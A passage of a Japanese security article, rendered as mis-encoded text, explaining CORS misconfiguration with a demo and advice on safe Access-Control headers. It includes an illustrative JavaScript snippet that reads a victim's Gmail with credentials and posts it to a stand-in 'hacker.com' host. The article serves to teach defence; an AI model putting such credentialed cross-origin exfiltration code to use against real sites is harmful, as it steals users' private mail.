<li>æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆãŒAjaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã„ã€Gmailä¸Šã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ¡ãƒ¼ãƒ«ã‚’å–å¾—ã—ã¾ã™ã€‚æ¬¡ã«JavaScriptã‚³ãƒ¼ãƒ‰ãŒãã‚Œã‚‰ã®ãƒ¡ãƒ¼ãƒ«ã‚’ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’ä½œæˆã—ãŸãƒãƒƒã‚«ãƒ¼ã«é€ã‚Šã¾ã™ã€‚</li>
<li>æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã¯ã€Gmailã«å¯¾ã—ã¦ç‰¹å®šã®HTTP POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®è¨­å®šã‚’å¤‰ãˆã€ãƒãƒƒã‚«ãƒ¼ãŒè¢«å®³è€…ã§ã‚ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®åå‰ã§ãƒ¡ãƒ¼ãƒ«ã‚’é€ä¿¡ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚
æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã¯ã€Gmailã«å¯¾ã—ã¦ç‰¹å®šã®HTTP POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã„ã€è¢«å®³è€…ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚</li>
</ul>
<p>ä»¥ä¸‹ã®JavaScriptã‚³ãƒ¼ãƒ‰ã®ã‚¹ãƒ‹ãƒšãƒƒãƒˆã¯ã€æ”»æ’ƒè€…ãŒã©ã®ã‚ˆã†ã«ã—ã¦è¢«å®³è€…ã®ãƒ¡ãƒ¼ãƒ«ã‚’å–å¾—ã—ã€è‡ªåˆ†ã®ã‚µãƒ¼ãƒãƒ¼ã«é€ä¿¡ã™ã‚‹ã®ã‹ã‚’ç¤ºã—ã¾ã™ã€‚å–å¾—ã—ãŸãƒ¡ãƒ¼ãƒ«ã¯ã‚µãƒ¼ãƒãƒ¼ã«ä¿å­˜ã—ã€å¾Œã§å‚ç…§ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span> <span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'https://gmail.com/emails'</span><span class="token punctuation">)</span>
xhr<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">true</span>
xhr<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">var</span> xhr2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
xhr2<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span> <span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'https://hacker.com/save_emails'</span><span class="token punctuation">)</span>
<span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token string">'emails='</span><span class="token operator">+</span>xhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span>
xhr2<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ä»¥ä¸‹ã¯ã“ã®ã‚·ãƒŠãƒªã‚ªã‚’ã‚¤ãƒ©ã‚¹ãƒˆã§è¡¨ã—ãŸã‚‚ã®ã§ã™ã€‚
<img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/06/exported_image2-1024x341.png">
ã“ã“ã§ç´¹ä»‹ã—ãŸä¾‹ã¯å˜ã«èª¬æ˜ã‚’ç›®çš„ã¨ã—ãŸã‚‚ã®ã§ã™ã€‚Gmailã«ã¯ãã®ã‚ˆã†ãªæ”»æ’ƒã‚’é˜²ãå„ªã‚ŒãŸCORSãƒãƒªã‚·ãƒ¼ãŒã‚ã‚Šã¾ã™ã€‚å®Ÿéš›ã«åŠ¹æœã‚’è¦‹ã¦ã„ãŸã ã‘ã‚‹ã‚ˆã†ã€ä¾‹ã¨ã—ã¦ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’ä½œæˆã—ã¦ã¿ã¾ã—ãŸã€‚</p>
<h2>ãƒ‡ãƒ¢</h2>
<p>ã“ã®æ”»æ’ƒã«ã¤ã„ã¦èª¬æ˜ã™ã‚‹ãŸã‚ã€ã‚·ãƒ³ãƒ—ãƒ«ã§è„†å¼±ãªã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’ä½œæˆã—ã¾ã—ãŸã€‚ã“ã®ãƒ‡ãƒ¢ã‚µã‚¤ãƒˆã¯ã€èªè¨¼ãŒå¿…è¦ãªã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã—ã¾ã™ã€‚ã¾ãšã€æ¬¡ã®URLã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€ãƒœã‚¿ãƒ³ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ãã ã•ã„ã€‚<a href="https://demo.devsecurely.com/demo_cors">https://demo.devsecurely.com/demo_cors</a></p>
<p>ãƒ­ã‚°ã‚¤ãƒ³ã—ãŸã‚‰ã€ä»¥ä¸‹ã®ãƒœã‚¿ãƒ³ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚å…ˆã»ã©ã®URLã«å¯¾ã—ã€èªè¨¼æƒ…å ±ã‚’å«ã‚ãŸAjaxãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé€ä¿¡ã•ã‚Œã¾ã™ã€‚</p>
<p>(â€»è¨³æ³¨ï¼šPOSTDã§ã¯æ–‡ç« ã®ç¿»è¨³ã®ã¿æ²è¼‰ã—ã¦ã„ã¾ã™)</p>
<p>[åŸæ–‡ï¼šã€Œæ”»æ’ƒé–‹å§‹ã€ãƒœã‚¿ãƒ³]</p>
<p>Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã®çµæœãŒä»¥ä¸‹ã«è¡¨ç¤ºã•ã‚Œã¾ã™ã€‚</p>
<p>[åŸæ–‡ï¼šçµæœè¡¨ç¤ºã‚¨ãƒªã‚¢]</p>
<p>æ‰‹é †ã«å¾“ã†ã¨ã€ã‚ãªãŸã®ãƒ‘ãƒ–ãƒªãƒƒã‚¯IPã‚¢ãƒ‰ãƒ¬ã‚¹ãŒä¸Šã«è¡¨ç¤ºã•ã‚Œã‚‹ã¯ãšã§ã™ã€‚ã€Œæ”»æ’ƒé–‹å§‹ã€ãƒœã‚¿ãƒ³ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ãŸã¨ãã€ã‚ãªãŸã®ãƒ–ãƒ©ã‚¦ã‚¶ã¯ä»¥ä¸‹ã®JavaScriptã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã—ãŸã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">var</span> xhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhttp<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"Your IP address"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"demo_website_dontent"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText
<span class="token keyword">else</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"demo_website_dontent"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent<span class="token operator">=</span><span class="token string">"You need to be authenticated first"</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
xhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"https://demo.devsecurely.com/demo_cors"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhttp<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
xhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã‚ãªãŸã®ãƒ–ãƒ©ã‚¦ã‚¶ã¯ã€HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ç›´æ¥å®Ÿè¡Œã™ã‚‹ã‹ã€ãƒ—ãƒªãƒ•ãƒ©ã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å®Ÿè¡Œã—ã€CORSãƒãƒªã‚·ãƒ¼ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ã‹ã‚’åˆ¤æ–­ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã—ãŸã€‚ã“ã‚Œã¯å˜ç´”ãªGETãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ã€ã‚«ã‚¹ã‚¿ãƒ HTTPãƒ˜ãƒƒãƒ€ãƒ¼ã‚‚ãªã„ã®ã§ãƒ–ãƒ©ã‚¦ã‚¶ã¯ç›´æ¥ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã„ã¾ã—ãŸã€‚ã“ã¡ã‚‰ãŒã€ã‚ãªãŸã®ãƒ–ãƒ©ã‚¦ã‚¶ãŒé€ä¿¡ã—ãŸç”Ÿã®HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ã™ã€‚</p>
<p><img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/06/request1.png"></p>
<p>ã“ã‚Œã«å¯¾ã—ã€è„†å¼±ãªã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã¯ä»¥ä¸‹ã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’é€ã‚Šè¿”ã—ã¾ã—ãŸã€‚</p>
<p><img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/06/response1.png"></p>
<p>æ¬¡ã«ã€ãƒ–ãƒ©ã‚¦ã‚¶ã¯JavaScriptã‚³ãƒ¼ãƒ‰ãŒãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ã‹ã‚’åˆ¤æ–­ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã—ãŸã€‚ã—ãŸãŒã£ã¦ã€CORSãƒãƒªã‚·ãƒ¼ã®ãƒã‚§ãƒƒã‚¯ã‚’è¡Œã„ã¾ã—ãŸã€‚4ã¤ã®æ¡ä»¶ã‚’ã™ã¹ã¦è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚</p>
<ul>
<li>Access-Control-Allow-Originãƒ˜ãƒƒãƒ€ãƒ¼ã®å€¤ã«ã¯ã€Œ <a href="https://www.devsecurely.com">https://www.devsecurely.com</a> ã€ãŒè¨­å®šã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ã€Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã£ãŸã®ã¨åŒã˜ã‚ªãƒªã‚¸ãƒ³ã§ã™ã€‚âœ…</li>
<li>ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯èªè¨¼æƒ…å ±ã‚ã‚Šã§è¡Œã„ã€ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ã¯Access-Control-Allow-Credentialsãƒ˜ãƒƒãƒ€ãƒ¼ãŒå­˜åœ¨ã—ã€å€¤ã¯ã€Œtrueã€ã§ã™ã€‚âœ…</li>
<li>ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ã‚«ã‚¹ã‚¿ãƒ HTTPãƒ˜ãƒƒãƒ€ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã›ã‚“ã€‚ãã®ãŸã‚ã€ãƒ–ãƒ©ã‚¦ã‚¶ã¯Access-Control-Allow-Headersãƒ˜ãƒƒãƒ€ãƒ¼ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã›ã‚“ã€‚âœ…</li>
<li>ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å®Ÿè¡Œã—ã¾ã™ã€‚ãã®ãŸã‚ã€ãƒ–ãƒ©ã‚¦ã‚¶ã¯Access-Control-Allow-Methodsãƒ˜ãƒƒãƒ€ãƒ¼ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã›ã‚“ã€‚âœ…</li>
</ul>
<p>CORSã®ãƒã‚§ãƒƒã‚¯ã¯ã™ã¹ã¦æˆåŠŸã—ã¾ã—ãŸã€‚ã—ãŸãŒã£ã¦ã€ãƒ–ãƒ©ã‚¦ã‚¶ã¯JavaScriptãŒãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã®ã‚’è¨±å¯ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã“ã®ãƒ–ãƒ­ã‚°ãŒè„†å¼±ãªã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆä¸Šã«ã‚ã‚‹ã‚ãªãŸã®å€‹äººãƒ‡ãƒ¼ã‚¿ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚</p>
<h2>å®‰å…¨ãªCORSãƒãƒªã‚·ãƒ¼ã‚’å®šç¾©ã™ã‚‹æ–¹æ³•</h2>
<p>CORSãƒãƒªã‚·ãƒ¼ã¯ã€ç‰¹å®šã®HTTPãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã«ã‚ˆã£ã¦å®šç¾©ã•ã‚Œã¾ã™ã€‚å„ãƒ˜ãƒƒãƒ€ãƒ¼ã«ã¤ã„ã¦ã€å€¤ãŒååˆ†ã«å³æ ¼ã§ã‚ã‚Šã€æ‚ªæ„ã®ã‚ã‚‹æ´»å‹•ã‚’é˜²ã’ã‚‹ã“ã¨ã‚’ç¢ºèªã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã¾ãŸã€ãƒãƒªã‚·ãƒ¼ãŒæ­£å½“ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒ–ãƒ­ãƒƒã‚¯ã—ãªã„ã‚ˆã†ã«ã™ã‚‹å¿…è¦ã‚‚ã‚ã‚Šã¾ã™ã€‚å„ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã®å€¤ã‚’å®šç¾©ã—ã¾ã—ã‚‡ã†ã€‚</p>
<ul>
<li><strong>Access-Control-Allow-Origin</strong>ï¼šã“ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã®å€¤ã¯ã€ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®å‘¼ã³å‡ºã—ã‚’è¨±å¯ã•ã‚ŒãŸã‚ªãƒªã‚¸ãƒ³ã§ãªãã¦ã¯ã„ã‘ã¾ã›ã‚“ã€‚ä¾‹ãˆã°ã€<code class="language-text">https://api.example.com</code>ã«ãƒ›ã‚¹ãƒˆã•ã‚ŒãŸAPIãŒã‚ã‚Šã€ãã®APIã‚’å‘¼ã³å‡ºã™ã€<code class="language-text">https://www.example.com</code>ã«ãƒ›ã‚¹ãƒˆã•ã‚ŒãŸã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒã‚ã‚‹ã¨ã—ã¾ã™ã€‚ã“ã®ã‚·ãƒŠãƒªã‚ªã§ã¯ã€<strong>Access-Control-Allow-Origin</strong>ãƒ˜ãƒƒãƒ€ãƒ¼ã«ã¯å¸¸ã«<code class="language-text">https://www.example.com</code>ãŒå€¤ã¨ã—ã¦è¨­å®šã•ã‚Œã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
<ul>
<li>è¤‡æ•°ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆãŒã‚ãªãŸã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’å‘¼ã³å‡ºã›ã‚‹ã‚ˆã†ã«ã™ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆã€è¨±å¯ã•ã‚ŒãŸã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆã‚’å®šç¾©ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã™ã¹ã¦ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«å¯¾ã—ã¦ã€<strong>Origin</strong>ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ˜ãƒƒãƒ€ãƒ¼ã«ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆä¸Šã®ã‚ªãƒªã‚¸ãƒ³ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ç¢ºèªã—ã¾ã™ã€‚
<ul>
<li>å«ã¾ã‚Œã¦ã„ã‚‹å ´åˆã€<strong>Origin</strong>ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ˜ãƒƒãƒ€ãƒ¼ã®å€¤ã‚’<strong>Access-Control-Allow-Origin</strong>ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã®å€¤ã¨ã—ã¦è¿”ã—ã¾ã™ã€‚</li>
<li>å«ã¾ã‚Œã¦ã„ãªã„å ´åˆã€<strong>Access-Control-Allow-Origin</strong>ãƒ˜ãƒƒãƒ€ãƒ¼ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆå€¤ã‚’è¿”ã—ã¾ã™ã€‚</li>
</ul>
</li>
<li>ä»–ã®ã‚ªãƒªã‚¸ãƒ³ãŒã‚ãªãŸã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’å‘¼ã³å‡ºã›ã‚‹ã¹ãã§ãªã„å ´åˆï¼ˆä¾‹ãˆã°ã€ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆå…¨ä½“ãŒ<code class="language-text">https://www.example.com</code>ã«ãƒ›ã‚¹ãƒˆã•ã‚Œã¦ã„ã‚‹å ´åˆãªã©ï¼‰ã€ã“ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã¯å®šç¾©ã—ã¾ã›ã‚“ã€‚</li>
</ul>
</li>
<li><strong>Access-Control-Allow-Credentials</strong>ï¼šã‚ãªãŸã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆãŒCookieï¼ˆã‚»ãƒƒã‚·ãƒ§ãƒ³Cookieãªã©ï¼‰ã‚’ä½¿ç”¨ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’èªè¨¼ã™ã‚‹å ´åˆã€ã“ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã®å€¤ã¯ã€Œtrueã€ã«è¨­å®šã—ã¾ã™ã€‚
<ul>
<li>ä»–ã®ã‚ªãƒªã‚¸ãƒ³ãŒã‚ãªãŸã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’å‘¼ã³å‡ºã›ã‚‹ã¹ãã§ãªã„å ´åˆã€ã“ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã¯å®šç¾©ã—ã¾ã›ã‚“ã€‚</li>
</ul>
</li>
<li><strong>Access-Control-Allow-Headers</strong>ï¼šãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ã‚«ã‚¹ã‚¿ãƒ HTTPãƒ˜ãƒƒãƒ€ãƒ¼ã‚’å«ã‚ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆã€ã“ã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã«è¿½åŠ ã—ã¦ãã ã•ã„ã€‚è¤‡æ•°ã®HTTPãƒ˜ãƒƒãƒ€ãƒ¼ãŒå¿…è¦ãªå ´åˆã€ã‚«ãƒ³ãƒåŒºåˆ‡ã‚Šãƒªã‚¹ãƒˆã¨ã—ã¦è¿½åŠ ã—ã¦ãã ã•ã„ã€‚
<ul>
<li>ä»–ã®ã‚ªãƒªã‚¸ãƒ³ãŒã‚ãªãŸã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’å‘¼ã³å‡ºã›ã‚‹ã¹ãã§ãªã„å ´åˆã€ã“ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã¯å®šç¾©ã—ã¾ã›ã‚“ã€‚</li>
</ul>
</li>
<li><strong>Access-Control-Allow-Methods</strong>ï¼š<strong>ã‚ãªãŸã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆãŒPUTã¾ãŸã¯DELETE HTTPãƒ¡ã‚½ãƒƒãƒ‰ã‚’æ‰±ã†å ´åˆã€ã“ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã«ã‚«ãƒ³ãƒåŒºåˆ‡ã‚Šãƒªã‚¹ãƒˆã¨ã—ã¦è¿½åŠ ã—ã¦ãã ã•ã„</strong>ã€‚
<ul>
<li>ä»–ã®ã‚ªãƒªã‚¸ãƒ³ãŒã‚ãªãŸã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’å‘¼ã³å‡ºã›ã‚‹ã¹ãã§ãªã„å ´åˆã€ã“ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã¯å®šç¾©ã—ã¾ã›ã‚“ã€‚</li>
</ul>
</li>
</ul>
<p>ãƒ—ãƒªãƒ•ãƒ©ã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆï¼ˆHTTP OPTIONSãƒªã‚¯ã‚¨ã‚¹ãƒˆï¼‰ã‚’å—ã‘å–ã£ãŸå ´åˆã€ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã®ã¿ã‚’è¿”ã—ã€ãã‚Œä»¥å¤–ã®å‡¦ç†ã¯è¡Œã‚ãªã„ã‚ˆã†ã«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚</p>
<p>ã¾ãŸã€ã“ã‚Œã‚‰ã®å¤‰æ›´ã¯å¾ã€…ã«è¡Œã£ã¦ãã ã•ã„ã€‚å„å¤‰æ›´ã‚’è¡Œã£ãŸå¾Œã€ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆãŒæ­£å¸¸ã«å‹•ä½œã—ã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚CORSã®è¨­å®šã‚’å³ã—ãã—ã™ãã‚‹ã¨ã€ã‚ãªãŸã®APIï¼ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆï¼ˆã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãªã©ï¼‰ã‚’å‘¼ã³å‡ºã™ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ã§å•é¡ŒãŒç™ºç”Ÿã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚</p>
<h2>CSRFå¯¾ç­–ã¨ã—ã¦ã®CORSè¨­å®š</h2>
<p>å…ˆã»ã©èª¬æ˜ã—ãŸã‚ˆã†ã«ã€ãƒ–ãƒ©ã‚¦ã‚¶ã¯CORSãƒãƒªã‚·ãƒ¼ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ã“ã¨ãªããƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å®Ÿè¡Œã™ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã«ã‚ˆã£ã¦ã¯æœ›ã¾ã—ããªã„å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚</p>
<p>ä¾‹ãˆã°ã€ãƒ‡ãƒ¼ã‚¿ã‚’å¤‰æ›´ã™ã‚‹GET APIã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼ãŒã‚ã‚‹ã¨ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€CSRFã¨å‘¼ã°ã‚Œã‚‹æ”»æ’ƒã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®è¨˜äº‹ã§ã¯ã€ã“ã®ã‚¿ã‚¤ãƒ—ã®è„†å¼±æ€§ã«ã¤ã„ã¦ã®è©³ç´°ãªèª¬æ˜ã¯çœãã¾ã™ãŒã€ã“ã®å•é¡Œã«ã¤ã„ã¦ã‚ˆã‚Šå…·ä½“çš„ã«æ¤œè¨ã™ã‚‹ãŸã‚ã«ä¾‹ã‚’æŒ™ã’ãŸã„ã¨æ€ã„ã¾ã™ã€‚</p>
